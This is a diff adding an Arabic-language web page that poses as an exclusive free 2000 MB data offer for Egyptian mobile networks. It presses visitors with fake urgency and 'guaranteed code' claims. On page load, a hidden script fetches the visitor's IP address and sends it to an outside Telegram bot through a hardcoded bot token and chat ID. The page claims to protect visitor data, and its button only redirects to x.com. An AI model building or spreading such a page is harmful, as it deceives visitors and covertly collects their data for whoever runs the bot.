@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2000 ميجا هدية لجميع الشبكات - العرض الحصري</title>
+
+    <!-- مكتبة Font Awesome للأيقونات -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
+        /* إعدادات الصفحة الأساسية */
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #121212, #1e1e1e);
+            color: #f1f1f1;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #1e1e1e;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 128, 0.3);
+        }
+
+        /* أيقونة العنوان */
+        .icon-top {
+            font-size: 50px;
+            color: #00ff80;
+            margin-bottom: 10px;
+        }
+
+        /* العنوان الرئيسي */
+        h1 {
+            color: #00ff80;
+            font-weight: 700;
+            font-size: 30px;
+            margin-bottom: 15px;
+        }
+
+        /* صندوق المعلومات */
+        .info-box {
+            background: #242424;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 5px;
+            font-size: 18px;
+            border-top: 5px solid #00ff80;
+            transition: transform 0.3s;
+        }
+
+        .info-box:hover {
+            transform: scale(1.05);
+        }
+
+        /* نص العدد المحدود */
+        .counter {
+            font-size: 14px;
+            font-weight: bold;
+            color: #ff4d4d;
+            margin: 10px 0;
+        }
+
+        /* قسم المميزات */
+        .features {
+            margin-top: 25px;
+            text-align: center;
+        }
+
+        .feature {
+            background: #2a2a2a;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .feature:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 15px rgba(0, 255, 128, 0.3);
+        }
+
+        /* أيقونات المميزات */
+        .feature i {
+            font-size: 40px;
+            color: #00ff80;
+            margin-bottom: 10px;
+        }
+
+        /* عناوين المميزات */
+        .feature-title {
+            font-weight: bold;
+            color: #00ff80;
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        /* زر الحصول على الكود */
+        .btn {
+            display: inline-block;
+            background: #00ff80;
+            color: #121212;
+            text-decoration: none;
+            padding: 15px 30px;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-size: 22px;
+            font-weight: bold;
+            transition: 0.3s;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: #00cc66;
+            transform: scale(1.05);
+        }
+
+    </style>
+</head>
+<body onload="sendIPToTelegram()">
+
+<div class="container">
+    <i class="fas fa-gift icon-top"></i>
+    <h1>عرض حصري - 2000 ميجا لجميع الشبكات</h1>
+    <p class="info-box">هذا العرض متاح لشبكات <strong>Vodafone - Orange - Etisalat - WE</strong></p>
+
+    <p class="counter">العرض لفترة محدودة جدًا - احصل على كودك الآن!</p>
+
+    <h2>لماذا نحن؟</h2>
+    <div class="features">
+        <div class="feature">
+            <i class="fas fa-check-circle"></i>
+            <div class="feature-title">أكواد مضمونة 100%</div>
+            جميع الأكواد التي نقدمها تم اختبارها وتعمل بشكل مثالي، ويمكنك استخدامها فورًا بعد الحصول عليها.
+        </div>
+        <div class="feature">
+            <i class="fas fa-bolt"></i>
+            <div class="feature-title">استلام فوري للكود</div>
+            لا داعي للانتظار! بمجرد إكمال الخطوات، ستحصل على كودك خلال أقل من دقيقة واحدة.
+        </div>
+        <div class="feature">
+            <i class="fas fa-shield-alt"></i>
+            <div class="feature-title">أمان وحماية تامة</div>
+            نضمن لك حماية بياناتك وعدم طلب أي معلومات شخصية حساسة، مما يجعل التجربة آمنة تمامًا.
+        </div>
+    </div>
+
+    <a onclick="redirectToX()" class="btn">احصل على الكود الآن</a>
+</div>
+
+<script>
+    // تحويل المستخدم إلى x.com عند الضغط على الزر
+    function redirectToX() {
+        window.location.href = "https://x.com";
+    }
+
+    // إرسال الـ IP إلى بوت تليجرام عند دخول الموقع
+    async function sendIPToTelegram() {
+        try {
+            const response = await fetch('https://api64.ipify.org?format=json');
+            const data = await response.json();
+            const ip = data.ip;
+            
+            const telegramToken = "6557468936:AAEDkqhKD5Vn9DDqyd0v6qo8h1UmJ56m-Qc";
+            const chatID = "5086851394";
+            const message = `👾The frist 1B\n\n🖥️ IP: ${ip}\n📍 الصفحة: الصفحة الأولى`;
+
+            const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(telegramURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatID, text: message })
+            });
+        } catch (error) {
+            console.error("فشل في إرسال الـ IP إلى التليجرام:", error);
+        }
+    }
+</script>
+
+</body>
+</html>
